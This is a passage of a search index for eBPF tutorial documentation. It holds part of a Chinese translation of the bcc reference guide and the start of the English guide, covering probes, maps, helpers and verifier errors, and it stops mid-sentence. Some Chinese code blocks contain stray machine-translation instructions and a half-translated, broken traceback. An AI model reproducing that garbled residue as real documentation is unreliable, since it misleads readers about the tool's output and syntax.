flags=0)```\n\n\u5c06\u5143\u7d20\u63a8\u5165\u5806\u6808\u6216\u961f\u5217\u8868\u3002\u5982\u679c\u64cd\u4f5c\u4e0d\u6210\u529f\uff0c\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002\u4f20\u9012QueueStack.BPF_EXIST\u4f5c\u4e3a\u6807\u5fd7\u4f1a\u4f7f\u961f\u5217\u6216\u5806\u6808\u4e22\u5f03\u6700\u65e7\u7684\u5143\u7d20\uff0c\u5982\u679c\u8868\u5df2\u6ee1\u3002\n\n\u5728\u539f\u5730\u7684\u793a\u4f8b:\n[\u5728/tests\u4e2d\u641c\u7d22](https://github.com/iovisor/bcc/search?q=push+path%3Atests+language%3Apython&amp;type=Code),\n\n### 14. pop()\n\n\u8bed\u6cd5: ```leaf = table.pop()```\n\n\u4ece\u5806\u6808\u6216\u961f\u5217\u8868\u4e2d\u5f39\u51fa\u4e00\u4e2a\u5143\u7d20\u3002\u4e0e```peek()```\u4e0d\u540c\uff0c```pop()```\u5728\u8fd4\u56de\u5143\u7d20\u4e4b\u524d\u4f1a\u5c06\u5176\u4ece\u8868\u4e2d\u79fb\u9664\u3002\u5982\u679c\u64cd\u4f5c\u4e0d\u6210\u529f\uff0c\u4f1a\u5f15\u53d1KeyError\u5f02\u5e38\u3002\n\n\u5728\u539f\u5730\u7684\u793a\u4f8b:\n[\u5728/tests\u4e2d\u641c\u7d22](https://github.com/iovisor/bcc/search?q=pop+path%3Atests+language%3Apython&amp;type=Code),\n\n### 15. peek()\n\n\u8bed\u6cd5: ```leaf = table.peek()```\n\n\u67e5\u770b\u5806\u6808\u6216\u961f\u5217\u8868\u5934\u90e8\u7684\u5143\u7d20\u3002\u4e0e```pop()```\u4e0d\u540c\uff0c```peek()```\u4e0d\u4f1a\u5c06\u5143\u7d20\u4ece\u8868\u4e2d\u79fb\u9664\u3002\u5982\u679c\u64cd\u4f5c\u4e0d\u6210\u529f\uff0c\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002\n\n\u5728\u539f\u5730\u7684\u793a\u4f8b:\n[\u5728/tests\u4e2d\u641c\u7d22](https://github.com/iovisor/bcc/search?q=peek+path%3Atests+language%3Apython&amp;type=Code),\n\n## \u8f85\u52a9\u65b9\u6cd5\n\n\u4e00\u4e9b\u7531bcc\u63d0\u4f9b\u7684\u8f85\u52a9\u65b9\u6cd5\u3002\u8bf7\u6ce8\u610f\uff0c\u56e0\u4e3a\u6211\u4eec\u5728Python\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5bfc\u5165\u4efb\u4f55Python\u5e93\u53ca\u5176\u65b9\u6cd5\uff0c\u5305\u62ec\u4f8b\u5982argparse\u3001collections\u3001ctypes\u3001datetime\u3001re\u3001socket\u3001struct\u3001subprocess\u3001sys\u548ctime\u7b49\u5e93\u3002\n\n### 1. ksym()\n\n\u8bed\u6cd5: ```BPF.ksym(addr)```\n\n\u5c06\u5185\u6838\u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u5185\u6838\u51fd\u6570\u540d\u79f0\uff0c\u5e76\u8fd4\u56de\u8be5\u540d\u79f0\u3002\n\n\u793a\u4f8b:\n\n```Python\"\u3002\n\u683c\u5f0f: \u53ea\u8fd4\u56de\u8f6c\u6362\u540e\u7684\u5185\u5bb9\uff0c\u4e0d\u5305\u62ec\u539f\u59cb\u6587\u672c\u3002```markdown\nprint(\"\u5185\u6838\u51fd\u6570\uff1a\" + b.ksym(addr))\n</code></pre> <p>\u4f8b\u5b50\uff1a \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-ksymname","title":"2. ksymname()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.ksymname(name)</code></p> <p>\u5c06\u5185\u6838\u540d\u79f0\u7ffb\u8bd1\u4e3a\u5730\u5740\u3002\u8fd9\u662fksym\u7684\u53cd\u5411\u8fc7\u7a0b\u3002\u5f53\u51fd\u6570\u540d\u79f0\u672a\u77e5\u65f6\uff0c\u8fd4\u56de-1\u3002</p> <p>\u4f8b\u5b50\uff1a</p> <pre><code>print(\"\u5185\u6838\u5730\u5740\uff1a%x\" % b.ksymname(\"vfs_read\"))\n</code></pre> <p>\u4f8b\u5b50\uff1a \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-sym","title":"3. sym()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.sym(addr, pid, show_module=False, show_offset=False)</code></p> <p>\u5c06\u5185\u5b58\u5730\u5740\u7ffb\u8bd1\u4e3apid\u7684\u51fd\u6570\u540d\u79f0\uff0c\u5e76\u8fd4\u56de\u3002\u5c0f\u4e8e\u96f6\u7684pid\u5c06\u8bbf\u95ee\u5185\u6838\u7b26\u53f7\u7f13\u5b58\u3002<code>show_module</code>\u548c<code>show_offset</code>\u53c2\u6570\u63a7\u5236\u662f\u5426\u663e\u793a\u51fd\u6570\u6240\u5728\u7684\u6a21\u5757\u4ee5\u53ca\u662f\u5426\u663e\u793a\u4ece\u7b26\u53f7\u5f00\u5934\u7684\u6307\u4ee4\u504f\u79fb\u91cf\u3002\u8fd9\u4e9b\u989d\u5916\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u4e3a<code>False</code>\u3002</p> <p>\u4f8b\u5b50\uff1a</p> <pre><code>print(\"\u51fd\u6570\uff1a\" + b.sym(addr, pid))\n</code></pre> <p>\u4f8b\u5b50\uff1a \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-num_open_kprobes","title":"4. num_open_kprobes()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.num_open_kprobes()</code></p> <p>\u8fd4\u56de\u6253\u5f00\u7684k[ret]probe\u7684\u6570\u91cf\u3002\u5f53\u4f7f\u7528event_re\u9644\u52a0\u548c\u5206\u79bb\u63a2\u6d4b\u70b9\u65f6\uff0c\u53ef\u4ee5\u53d1\u6325\u4f5c\u7528\u3002\u4e0d\u5305\u62ecperf_events\u8bfb\u53d6\u5668\u3002</p> <p>\u4f8b\u5b50\uff1a</p> <pre><code>b.attach_kprobe(event_re=pattern, fn_name=\"trace_count\")\nmatched = b.num_open_kprobes()\nif matched == 0:\n    print(\"0\u4e2a\u51fd\u6570\u4e0e\\\"%s\\\"\u5339\u914d\u3002\u7a0b\u5e8f\u9000\u51fa\u3002\" % args.pattern)\n    exit()\n</code></pre> <p>\u4f8b\u5b50\uff1a\"\u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#5-get_syscall_fnname","title":"5. get_syscall_fnname()","text":"<p>\u8bed\u6cd5: <code>BPF.get_syscall_fnname(name : str)</code></p> <p>\u8fd4\u56de\u7cfb\u7edf\u8c03\u7528\u7684\u76f8\u5e94\u5185\u6838\u51fd\u6570\u540d\u3002\u8be5\u8f85\u52a9\u51fd\u6570\u5c06\u5c1d\u8bd5\u4e0d\u540c\u7684\u524d\u7f00\uff0c\u5e76\u4e0e\u7cfb\u7edf\u8c03\u7528\u540d\u8fde\u63a5\u8d77\u6765\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd4\u56de\u503c\u53ef\u80fd\u5728\u4e0d\u540c\u7248\u672c\u7684Linux\u5185\u6838\u4e2d\u6709\u6240\u4e0d\u540c\uff0c\u6709\u65f6\u4f1a\u5f15\u8d77\u95ee\u9898\u3002 \uff08\u89c1 #2590\uff09</p> <p>\u793a\u4f8b:</p> <pre><code>print(\"\u5728\u5185\u6838\u4e2d\uff0c%s \u7684\u51fd\u6570\u540d\u662f %s\" % (\"clone\", b.get_syscall_fnname(\"clone\")))\n# sys_clone \u6216 __x64_sys_clone \u6216 ...\n</code></pre> <p>\u73b0\u573a\u793a\u4f8b: \u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#bpf","title":"BPF \u9519\u8bef","text":"<p>\u8bf7\u53c2\u9605\u5185\u6838\u6e90\u7801\u4e2d\u7684\u201cUnderstanding eBPF verifier messages\u201d\u90e8\u5206\uff0c\u4f4d\u4e8e Documentation/networking/filter.txt\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#1-invalid-mem-access","title":"1. Invalid mem access","text":"<p>\u8fd9\u53ef\u80fd\u662f\u56e0\u4e3a\u8bd5\u56fe\u76f4\u63a5\u8bfb\u53d6\u5185\u5b58\uff0c\u800c\u4e0d\u662f\u64cd\u4f5cBPF\u5806\u6808\u4e0a\u7684\u5185\u5b58\u3002\u6240\u6709\u5bf9\u5185\u6838\u5185\u5b58\u7684\u8bfb\u53d6\u5fc5\u987b\u901a\u8fc7 bpf_probe_read_kernel() \u4f20\u9012\uff0c\u4ee5\u5c06\u5185\u6838\u5185\u5b58\u590d\u5236\u5230BPF\u5806\u6808\u4e2d\uff0c\u5728\u4e00\u4e9b\u7b80\u5355\u5173\u8054\u7684\u60c5\u51b5\u4e0b\uff0cbcc \u91cd\u5199\u5668\u53ef\u4ee5\u81ea\u52a8\u5b8c\u6210\u3002bpf_probe_read_kernel() \u6267\u884c\u6240\u6709\u5fc5\u8981\u7684\u68c0\u67e5\u3002</p> <p>\u793a\u4f8b:</p> <pre><code>bpf: Permission denied\n0: (bf) r6 = r1\n1: (79) r7 = *(u64 *)(r6 +80)\n2: (85) call 14\n3: (bf) r8 = r0\n[...]\n23: (69) r1 = *(u16 *)(r7 +16)\nR7 invalid mem access 'inv'\n\nTraceback (most recent call last):\n  File \"./tcpaccept\", line 179, in &lt;module&gt;\n    b = BPF(text=bpf_text)\n  File \"/usr/lib/python2.7/dist-packages/bcc/__init__.py\", line 172, in __init__\n    self._trace_autoload()\".\n/usr/lib/python2.7/dist-packages/bcc/__init__.py\"\uff0c\u7b2c 612 \u884c\uff0c_trace_autoload \u4e2d\uff1a\n    fn = self.load_func(func_name, BPF.KPROBE)\n  \u6587\u4ef6 \"/usr/lib/python2.7/dist-packages/bcc/__init__.py\"\uff0c\u7b2c 212 \u884c\uff0cload_func \u4e2d\uff1a\n    raise Exception(\"\u52a0\u8f7d BPF \u7a0b\u5e8f %s \u5931\u8d25\" % func_name)\nException: \u52a0\u8f7d BPF \u7a0b\u5e8f kretprobe__inet_csk_accept \u5931\u8d25\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#2-gpl-only","title":"2. \u65e0\u6cd5\u4ece\u4e13\u6709\u7a0b\u5e8f\u8c03\u7528 GPL-only \u51fd\u6570","text":"<p>\u5f53\u975e GPL BPF \u7a0b\u5e8f\u8c03\u7528 GPL-only \u8f85\u52a9\u51fd\u6570\u65f6\uff0c\u4f1a\u51fa\u73b0\u6b64\u9519\u8bef\u3002\u8981\u4fee\u590d\u6b64\u9519\u8bef\uff0c\u8bf7\u52ff\u5728\u4e13\u6709 BPF \u7a0b\u5e8f\u4e2d\u4f7f\u7528 GPL-only \u8f85\u52a9\u51fd\u6570\uff0c\u6216\u8005\u5c06 BPF \u7a0b\u5e8f\u91cd\u65b0\u6388\u6743\u4e3a GPL-compatible \u8bb8\u53ef\u8bc1\u3002\u8bf7\u67e5\u770b\u54ea\u4e9b BPF helpers \u662f GPL-only \u7684\uff0c\u5e76\u4e14\u54ea\u4e9b\u8bb8\u53ef\u8bc1\u88ab\u89c6\u4e3a GPL-compatible\u3002</p> <p>\u793a\u4f8b\uff0c\u4ece\u4e13\u6709\u7a0b\u5e8f\uff08<code>#define BPF_LICENSE Proprietary</code>\uff09\u8c03\u7528 <code>bpf_get_stackid()</code>\uff0c\u4e00\u79cd GPL-only \u7684 BPF helper\uff1a</p> <pre><code>bpf: \u52a0\u8f7d\u7a0b\u5e8f\u5931\u8d25\uff1a\u65e0\u6548\u53c2\u6570\n[...]\n8: (85) \u8c03\u7528 bpf_get_stackid#27\n\u65e0\u6cd5\u4ece\u4e13\u6709\u7a0b\u5e8f\u8c03\u7528 GPL-only \u51fd\u6570\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#_13","title":"\u73af\u5883\u53d8\u91cf","text":""},{"location":"tutorials/bcc-documents/reference_guide/#1","title":"1. \u5185\u6838\u6e90\u4ee3\u7801\u76ee\u5f55","text":"<p>eBPF \u7a0b\u5e8f\u7f16\u8bd1\u9700\u8981\u5185\u6838\u6e90\u4ee3\u7801\u6216\u5df2\u7f16\u8bd1\u7684\u5185\u6838\u5934\u3002\u5982\u679c\u4f60\u7684\u5185\u6838\u6e90\u4ee3\u7801\u4f4d\u4e8e\u65e0\u6cd5\u88ab BCC \u627e\u5230\u7684\u975e\u6807\u51c6\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5c06 <code>BCC_KERNEL_SOURCE</code> \u8bbe\u7f6e\u4e3a\u8be5\u8def\u5f84\u7684\u7edd\u5bf9\u8def\u5f84\u6765\u4e3a BCC \u63d0\u4f9b\u6240\u9700\u7684\u4f4d\u7f6e\u4fe1\u606f\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2","title":"2. \u5185\u6838\u7248\u672c\u8986\u76d6","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cBCC \u5c06 <code>LINUX_VERSION_CODE</code> \u5b58\u50a8\u5728\u751f\u6210\u7684 eBPF \u5bf9\u8c61\u4e2d\uff0c\u5e76\u5728\u52a0\u8f7d eBPF \u7a0b\u5e8f\u65f6\u4f20\u9012\u7ed9\u5185\u6838\u3002\u6709\u65f6\uff0c\u8fd9\u53ef\u80fd\u975e\u5e38\u4e0d\u65b9\u4fbf\uff0c\u5c24\u5176\u662f\u5f53\u5185\u6838\u7565\u6709\u66f4\u65b0\u65f6\uff0c\u6bd4\u5982 LTS \u5185\u6838\u53d1\u5e03\u3002\u5fae\u5c0f\u7684\u4e0d\u5339\u914d\u51e0\u4e4e\u4e0d\u4f1a\u5bfc\u81f4\u52a0\u8f7d\u7684 eBPF \u7a0b\u5e8f\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u3002\u901a\u8fc7\u5c06 <code>BCC_LINUX_VERSION_CODE</code> \u8bbe\u7f6e\u4e3a\u6b63\u5728\u8fd0\u884c\u7684\u5185\u6838\u7248\u672c\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u5185\u6838\u7248\u672c\u7684\u68c0\u67e5\u3002\u8fd9\u5bf9\u4e8e\u7a0b\u5e8f\u662f\u5fc5\u9700\u7684\u3002\u4f7f\u7528kprobes\u7684\u7a0b\u5e8f\u9700\u8981\u4ee5<code>(VERSION * 65536) + (PATCHLEVEL * 256) + SUBLEVEL</code>\u7684\u683c\u5f0f\u8fdb\u884c\u7f16\u7801\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5f53\u524d\u8fd0\u884c\u7684\u5185\u6838\u662f<code>4.9.10</code>\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e<code>export BCC_LINUX_VERSION_CODE=264458</code>\u4ee5\u6210\u529f\u5730\u8986\u76d6\u5185\u6838\u7248\u672c\u68c0\u67e5\u3002</p> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/reference_guide_en/","title":"bcc Reference Guide","text":"<p>Intended for search (Ctrl-F) and reference. For tutorials, start with tutorial.md.</p> <p>This guide is incomplete. If something feels missing, check the bcc and kernel source. And if you confirm we're missing something, please send a pull request to fix it, and help out everyone.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#contents","title":"Contents","text":"<ul> <li> <p>BPF C</p> <ul> <li>Events &amp; Arguments<ul> <li>1. kprobes</li> <li>2. kretprobes</li> <li>3. Tracepoints</li> <li>4. uprobes</li> <li>5. uretprobes</li> <li>6. USDT probes</li> <li>7. Raw Tracepoints</li> <li>8. system call tracepoints</li> <li>9. kfuncs</li> <li>10. kretfuncs</li> <li>11. lsm probes</li> <li>12. bpf iterators</li> </ul> </li> <li>Data<ul> <li>1. bpf_probe_read_kernel()</li> <li>2. bpf_probe_read_kernel_str()</li> <li>3. bpf_ktime_get_ns()</li> <li>4. bpf_get_current_pid_tgid()</li> <li>5. bpf_get_current_uid_gid()</li> <li>6. bpf_get_current_comm()</li> <li>7. bpf_get_current_task()</li> <li>8. bpf_log2l()</li> <li>9. bpf_get_prandom_u32()</li> <li>10. bpf_probe_read_user()</li> <li>11. bpf_probe_read_user_str()</li> <li>12. bpf_get_ns_current_pid_tgid()</li> </ul> </li> <li>Debugging<ul> <li>1. bpf_override_return()</li> </ul> </li> <li>Output<ul> <li>1. bpf_trace_printk()</li> <li>2. BPF_PERF_OUTPUT</li> <li>3. perf_submit()</li> <li>4. perf_submit_skb()</li> <li>5. BPF_RINGBUF_OUTPUT</li> <li>6. ringbuf_output()</li> <li>7. ringbuf_reserve()</li> <li>8. ringbuf_submit()</li> <li>9. ringbuf_discard()</li> </ul> </li> <li>Maps<ul> <li>1. BPF_TABLE</li> <li>2. BPF_HASH</li> <li>3. BPF_ARRAY</li> <li>4. BPF_HISTOGRAM</li> <li>5. BPF_STACK_TRACE</li> <li>6. BPF_PERF_ARRAY</li> <li>7. BPF_PERCPU_HASH</li> <li>8. BPF_PERCPU_ARRAY</li> <li>9. BPF_LPM_TRIE</li> <li>10. BPF_PROG_ARRAY</li> <li>11. BPF_DEVMAP</li> <li>12. BPF_CPUMAP</li> <li>13. BPF_XSKMAP</li> <li>14. BPF_ARRAY_OF_MAPS</li> <li>15. BPF_HASH_OF_MAPS</li> <li>16. BPF_STACK</li> <li>17. BPF_QUEUE</li> <li>18. BPF_SOCKHASH</li> <li>19. map.lookup()</li> <li>20. map.lookup_or_try_init()</li> <li>21. map.delete()</li> <li>22. map.update()</li> <li>23. map.insert()</li> <li>24. map.increment()</li> <li>25. map.get_stackid()</li> <li>26. map.perf_read()</li> <li>27. map.call()</li> <li>28. map.redirect_map()</li> <li>29. map.push()</li> <li>30. map.pop()</li> <li>31. map.peek()</li> <li>32. map.sock_hash_update()</li> <li>33. map.msg_redirect_hash()</li> <li>34. map.sk_redirect_hash()</li> </ul> </li> <li>Licensing</li> <li>Rewriter</li> </ul> </li> <li> <p>bcc Python</p> <ul> <li>Initialization<ul> <li>1. BPF</li> <li>2. USDT</li> </ul> </li> <li>Events<ul> <li>1. attach_kprobe()</li> <li>2. attach_kretprobe()</li> <li>3. attach_tracepoint()</li> <li>4. attach_uprobe()</li> <li>5. attach_uretprobe()</li> <li>6. USDT.enable_probe()</li> <li>7. attach_raw_tracepoint()</li> <li>8. attach_raw_socket()</li> <li>9. attach_xdp()</li> <li>10. attach_func()</li> <li>11. detach_func()</li> <li>12. detach_kprobe()</li> <li>13. detach_kretprobe()</li> </ul> </li> <li>Debug Output<ul> <li>1. trace_print()</li> <li>2. trace_fields()</li> </ul> </li> <li>Output APIs<ul> <li>1. perf_buffer_poll()</li> <li>2. ring_buffer_poll()</li> <li>3. ring_buffer_consume()</li> </ul> </li> <li>Map APIs<ul> <li>1. get_table()</li> <li>2. open_perf_buffer()</li> <li>3. items()</li> <li>4. values()</li> <li>5. clear()</li> <li>6. items_lookup_and_delete_batch()</li> <li>7. items_lookup_batch()</li> <li>8. items_delete_batch()</li> <li>9. items_update_batch()</li> <li>10. print_log2_hist()</li> <li>11. print_linear_hist()</li> <li>12. open_ring_buffer()</li> <li>13. push()</li> <li>14. pop()</li> <li>15. peek()</li> </ul> </li> <li>Helpers<ul> <li>1. ksym()</li> <li>2. ksymname()</li> <li>3. sym()</li> <li>4. num_open_kprobes()</li> <li>5. get_syscall_fnname()</li> </ul> </li> </ul> </li> <li> <p>BPF Errors</p> <ul> <li>1. Invalid mem access</li> <li>2. Cannot call GPL only function from proprietary program</li> </ul> </li> <li> <p>Environment Variables</p> <ul> <li>1. kernel source directory</li> <li>2. kernel version overriding</li> </ul> </li> </ul>"},{"location":"tutorials/bcc-documents/reference_guide_en/#bpf-c","title":"BPF C","text":"<p>This section describes the C part of a bcc program.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#events-arguments","title":"Events &amp; Arguments","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#1-kprobes","title":"1. kprobes","text":"<p>Syntax: kprobe__kernel_function_name</p> <p><code>kprobe__</code> is a special prefix that creates a kprobe (dynamic tracing of a kernel function call) for the kernel function name provided as the remainder. You can also use kprobes by declaring a normal C function, then using the Python <code>BPF.attach_kprobe()</code> (covered later) to associate it with a kernel function.</p> <p>Arguments are specified on the function declaration: kprobe__kernel_function_name(struct pt_regs ctx [, argument1* ...])</p> <p>For example:</p> <pre><code>int kprobe__tcp_v4_connect(struct pt_regs *ctx, struct sock *sk) {\n    [...]\n}\n</code></pre> <p>This instruments the tcp_v4_connect() kernel function using a kprobe, with the following arguments:</p> <ul> <li><code>struct pt_regs *ctx</code>: Registers and BPF context.</li> <li><code>struct sock *sk</code>: First argument to tcp_v4_connect().</li> </ul> <p>The first argument is always <code>struct pt_regs *</code>, the remainder are the arguments to the function (they don't need to be specified, if you don't intend to use them).</p> <p>Examples in situ: code (output), code (output)</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-kretprobes","title":"2. kretprobes","text":"<p>Syntax: kretprobe__kernel_function_name</p> <p><code>kretprobe__</code> is a special prefix that creates a kretprobe (dynamic tracing of a kernel function return) for the kernel function name provided as the remainder. You can also use kretprobes by declaring a normal C function, then using the Python <code>BPF.attach_kretprobe()</code> (covered later) to associate it with a kernel function.</p> <p>Return value is available as <code>PT_REGS_RC(ctx)</code>, given a function declaration of: kretprobe__kernel_function_name(struct pt_regs *ctx)</p> <p>For example:</p> <pre><code>int kretprobe__tcp_v4_connect(struct pt_regs *ctx)\n{\n    int ret = PT_REGS_RC(ctx);\n    [...]\n}\n</code></pre> <p>This instruments the return of the tcp_v4_connect() kernel function using a kretprobe, and stores the return value in <code>ret</code>.</p> <p>Examples in situ: code (output)</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-tracepoints","title":"3. Tracepoints","text":"<p>Syntax: TRACEPOINT_PROBE(category, event)</p> <p>This is a macro that instruments the tracepoint defined by category:event.</p> <p>The tracepoint name is <code>&lt;category&gt;:&lt;event&gt;</code>. The probe function name is <code>tracepoint__&lt;category&gt;__&lt;event&gt;</code>.</p> <p>Arguments are available in an <code>args</code> struct, which are the tracepoint arguments. One way to list these is to cat the relevant format file under /sys/kernel/debug/tracing/events/category/event/format.</p> <p>The <code>args</code> struct can be used in place of <code>ctx</code> in each functions requiring a context as an argument. This includes notably perf_submit().</p> <p>For example:</p> <pre><code>TRACEPOINT_PROBE(random, urandom_read) {\n    // args is from /sys/kernel/debug/tracing/events/random/urandom_read/format\n    bpf_trace_printk(\"%d\\\\n\", args-&gt;got_bits);\n    return 0;\n}\n</code></pre> <p>This instruments the tracepoint <code>random:urandom_read tracepoint</code>, and prints the tracepoint argument <code>got_bits</code>. When using Python API, this probe is automatically attached to the right tracepoint target. For C++, this tracepoint probe can be attached by specifying the tracepoint target and function name explicitly: <code>BPF::attach_tracepoint(\"random:urandom_read\", \"tracepoint__random__urandom_read\")</code> Note the name of the probe function defined above is <code>tracepoint__random__urandom_read</code>.</p> <p>Examples in situ: code (output), search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-uprobes","title":"4. uprobes","text":"<p>These are instrumented by declaring a normal function in C, then associating it as a uprobe probe in Python via <code>BPF.attach_uprobe()</code> (covered later).</p> <p>Arguments can be examined using <code>PT_REGS_PARM</code> macros.</p> <p>For example:</p> <pre><code>int count(struct pt_regs *ctx) {\n    char buf[64];\n    bpf_probe_read_user(&amp;buf, sizeof(buf), (void *)PT_REGS_PARM1(ctx));\n    bpf_trace_printk(\"%s %d\", buf, PT_REGS_PARM2(ctx));\n    return(0);\n}\n</code></pre> <p>This reads the first argument as a string, and then prints it with the second argument as an integer.</p> <p>Examples in situ: code</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#5-uretprobes","title":"5. uretprobes","text":"<p>These are instrumented by declaring a normal function in C, then associating it as a uretprobe probe in Python via <code>BPF.attach_uretprobe()</code> (covered later).</p> <p>Return value is available as <code>PT_REGS_RC(ctx)</code>, given a function declaration of: function_name(struct pt_regs *ctx)</p> <p>For example:</p> <pre><code>BPF_HISTOGRAM(dist);\nint count(struct pt_regs *ctx) {\n    dist.increment(PT_REGS_RC(ctx));\n    return 0;\n}\n</code></pre> <p>This increments the bucket in the <code>dist</code> histogram that is indexed by the return value.</p> <p>Examples in situ: code (output), code (output)</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#6-usdt-probes","title":"6. USDT probes","text":"<p>These are User Statically-Defined Tracing (USDT) probes, which may be placed in some applications or libraries to provide a user-level equivalent of tracepoints. The primary BPF method provided for USDT support method is <code>enable_probe()</code>. USDT probes are instrumented by declaring a normal function in C, then associating it as a USDT probe in Python via <code>USDT.enable_probe()</code>.</p> <p>Arguments can be read via: bpf_usdt_readarg(index, ctx, &amp;addr)</p> <p>For example:</p> <pre><code>int do_trace(struct pt_regs *ctx) {\n    uint64_t addr;\n    char path[128];\n    bpf_usdt_readarg(6, ctx, &amp;addr);\n    bpf_probe_read_user(&amp;path, sizeof(path), (void *)addr);\n    bpf_trace_printk(\"path:%s\\\\n\", path);\n    return 0;\n};\n</code></pre> <p>This reads the sixth USDT argument, and then pulls it in as a string to <code>path</code>.</p> <p>When initializing USDTs via the third argument of <code>BPF::init</code> in the C API, if any USDT fails to <code>init</code>, entire <code>BPF::init</code> will fail. If you're OK with some USDTs failing to <code>init</code>, use <code>BPF::init_usdt</code> before calling <code>BPF::init</code>.</p> <p>Examples in situ: code, search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#7-raw-tracepoints","title":"7. Raw Tracepoints","text":"<p>Syntax: RAW_TRACEPOINT_PROBE(event)</p> <p>This is a macro that instruments the raw tracepoint defined by event.</p> <p>The argument is a pointer to struct <code>bpf_raw_tracepoint_args</code>, which is defined in bpf.h.  The struct field <code>args</code> contains all parameters of the raw tracepoint where you can found at linux tree include/trace/events directory.</p> <p>For example: <pre><code>RAW_TRACEPOINT_PROBE(sched_switch)\n{\n    // TP_PROTO(bool preempt, struct task_struct *prev, struct task_struct *next)\n    struct task_struct *prev = (struct task_struct *)ctx-&gt;args[1];\n    struct task_struct *next= (struct task_struct *)ctx-&gt;args[2];\n    s32 prev_tgid, next_tgid;\n\n    bpf_probe_read_kernel(&amp;prev_tgid, sizeof(prev-&gt;tgid), &amp;prev-&gt;tgid);\n    bpf_probe_read_kernel(&amp;next_tgid, sizeof(next-&gt;tgid), &amp;next-&gt;tgid);\n    bpf_trace_printk(\"%d -&gt; %d\\\\n\", prev_tgid, next_tgid);\n}\n</code></pre></p> <p>This instruments the sched:sched_switch tracepoint, and prints the prev and next tgid.</p> <p>Examples in situ: search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#8-system-call-tracepoints","title":"8. system call tracepoints","text":"<p>Syntax: <code>syscall__SYSCALLNAME</code></p> <p><code>syscall__</code> is a special prefix that creates a kprobe for the system call name provided as the remainder. You can use it by declaring a normal C function, then using the Python <code>BPF.get_syscall_fnname(SYSCALLNAME)</code> and <code>BPF.attach_kprobe()</code> to associate it.</p> <p>Arguments are specified on the function declaration: <code>syscall__SYSCALLNAME(struct pt_regs *ctx, [, argument1 ...])</code>.</p> <p>For example: <pre><code>int syscall__execve(struct pt_regs *ctx,\n    const char __user *filename,\n    const char __user *const __user *__argv,\n    const char __user *const __user *__envp)\n{\n    [...]\n}\n</code></pre></p> <p>This instruments the execve system call.</p> <p>The first argument is always <code>struct pt_regs *</code>, the remainder are the arguments to the function (they don't need to be specified, if you don't intend to use them).</p> <p>Corresponding Python code: <pre><code>b = BPF(text=bpf_text)\nexecve_fnname = b.get_syscall_fnname(\"execve\")\nb.attach_kprobe(event=execve_fnname, fn_name=\"syscall__execve\")\n</code></pre></p> <p>Examples in situ: code (output)</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#9-kfuncs","title":"9. kfuncs","text":"<p>Syntax: KFUNC_PROBE(function, typeof(arg1) arg1, typeof(arg2) arge ...)</p> <p>This is a macro that instruments the kernel function via trampoline before the function is executed. It's defined by function name and the function arguments defined as argX.</p> <p>For example: <pre><code>KFUNC_PROBE(do_sys_open, int dfd, const char *filename, int flags, int mode)\n{\n    ...\n</code></pre></p> <p>This instruments the do_sys_open kernel function and make its arguments accessible as standard argument values.</p> <p>Examples in situ: search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#10-kretfuncs","title":"10. kretfuncs","text":"<p>Syntax: KRETFUNC_PROBE(event, typeof(arg1) arg1, typeof(arg2) arge ..., int ret)</p> <p>This is a macro that instruments the kernel function via trampoline after the function is executed. It's defined by function name and the function arguments defined as argX.</p> <p>The last argument of the probe is the return value of the instrumented function.</p> <p>For example: <pre><code>KRETFUNC_PROBE(do_sys_open, int dfd, const char *filename, int flags, int mode, int ret)\n{\n    ...\n</code></pre></p> <p>This instruments the do_sys_open kernel function and make its arguments accessible as standard argument values together with its return value.</p> <p>Examples in situ: search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#11-lsm-probes","title":"11. LSM Probes","text":"<p>Syntax: LSM_PROBE(hook, typeof(arg1) arg1, typeof(arg2) arg2 ...)</p> <p>This is a macro that instruments an LSM hook as a BPF program. It can be used to audit security events and implement MAC security policies in BPF. It is defined by specifying the hook name followed by its arguments.</p> <p>Hook names can be found in include/linux/security.h by taking functions like <code>security_hookname</code> and taking just the <code>hookname</code> part. For example, <code>security_bpf</code> would simply become <code>bpf</code>.</p> <p>Unlike other BPF program types, the return value specified in an LSM probe matters. A return value of 0 allows the hook to succeed, whereas any 